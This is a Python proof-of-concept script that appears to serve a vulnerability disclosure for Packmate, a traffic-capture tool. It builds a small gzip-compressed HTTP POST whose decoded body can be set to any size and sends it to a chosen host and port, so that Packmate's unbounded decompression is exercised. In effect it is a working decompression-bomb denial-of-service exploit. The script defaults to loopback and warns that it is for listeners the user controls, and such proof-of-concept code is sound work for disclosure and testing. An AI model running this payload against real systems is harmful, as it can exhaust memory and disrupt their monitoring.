#!/usr/bin/env python3
"""Send a small gzip-compressed HTTP request with a configurable decoded size.

The target must have a TCP listener on the selected port. Packmate must capture
that connection and have the port configured as an HTTP service.
"""

from __future__ import annotations

import argparse
import socket
import sys
import zlib


CHUNK_SIZE = 1024 * 1024
DEFAULT_DECOMPRESSED_BYTES = 8 * 1024 * 1024


def byte_count(value: str) -> int:
    """Parse a positive byte count, optionally with KiB/MiB/GiB suffixes."""
    suffixes = {
        "": 1,
        "b": 1,
        "kib": 1024,
        "mib": 1024**2,
        "gib": 1024**3,
        "kb": 1000,
        "mb": 1000**2,
        "gb": 1000**3,
    }
    normalized = value.strip().lower()
    number = normalized
    suffix = ""
    for candidate in sorted(suffixes, key=len, reverse=True):
        if candidate and normalized.endswith(candidate):
            number = normalized[: -len(candidate)]
            suffix = candidate
            break
    try:
        result = int(number) * suffixes[suffix]
    except (KeyError, ValueError) as exc:
        raise argparse.ArgumentTypeError(
            "use an integer byte count, optionally with KiB/MiB/GiB"
        ) from exc
    if result <= 0:
        raise argparse.ArgumentTypeError("the decoded size must be greater than zero")
    return result


def gzip_repeated_bytes(decoded_size: int, fill_byte: int = ord("A")) -> bytes:
    """Create gzip data without allocating the decoded representation."""
    compressor = zlib.compressobj(level=9, wbits=16 + zlib.MAX_WBITS)
    compressed_parts: list[bytes] = []
    full_chunk = bytes([fill_byte]) * CHUNK_SIZE
    remaining = decoded_size

    while remaining:
        current_size = min(remaining, CHUNK_SIZE)
        compressed_parts.append(compressor.compress(full_chunk[:current_size]))
        remaining -= current_size

    compressed_parts.append(compressor.flush())
    return b"".join(compressed_parts)


def build_request(host_header: str, path: str, decoded_size: int) -> tuple[bytes, int]:
    body = gzip_repeated_bytes(decoded_size)
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Encoding: gzip\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"X-Packmate-Decoded-Bytes: {decoded_size}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii")
    return headers + body, len(body)


def send_request(host: str, port: int, request: bytes, timeout: float) -> None:
    with socket.create_connection((host, port), timeout=timeout) as connection:
        connection.settimeout(timeout)
        connection.sendall(request)
        connection.shutdown(socket.SHUT_WR)


def parser() -> argparse.ArgumentParser:
    result = argparse.ArgumentParser(
        description=(
            "Send a gzip HTTP POST to demonstrate Packmate's unbounded HTTP "
            "decompression. Use only against a listener you control."
        )
    )
    result.add_argument("--host", default="127.0.0.1", help="target host (default: loopback)")
    result.add_argument("--port", required=True, type=int, help="target TCP port")
    result.add_argument(
        "--decompressed-bytes",
        type=byte_count,
        default=DEFAULT_DECOMPRESSED_BYTES,
        help="decoded body size, e.g. 104857600 or 100MiB (default: 8MiB)",
    )
    result.add_argument("--path", default="/packmate-gzip-poc", help="HTTP request path")
    result.add_argument("--timeout", default=10.0, type=float, help="connect/send timeout in seconds")
    return result


def main() -> int:
    args = parser().parse_args()
    if not 1 <= args.port <= 65535:
        print("error: port must be between 1 and 65535", file=sys.stderr)
        return 2
    if not args.path.startswith("/"):
        print("error: path must start with '/'", file=sys.stderr)
        return 2

    request, compressed_size = build_request(
        f"{args.host}:{args.port}", args.path, args.decompressed_bytes
    )
    ratio = args.decompressed_bytes / compressed_size

    print(f"Target:             {args.host}:{args.port}")
    print(f"Compressed body:    {compressed_size:,} bytes")
    print(f"Decoded body:       {args.decompressed_bytes:,} bytes")
    print(f"Expansion ratio:    {ratio:,.1f}x")
    print(f"TCP bytes to send:  {len(request):,} bytes")

    try:
        send_request(args.host, args.port, request, args.timeout)
    except OSError as exc:
        print(f"send failed: {exc}", file=sys.stderr)
        return 1

    print("Request sent. Wait for the stream to close or for Packmate's timeout.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
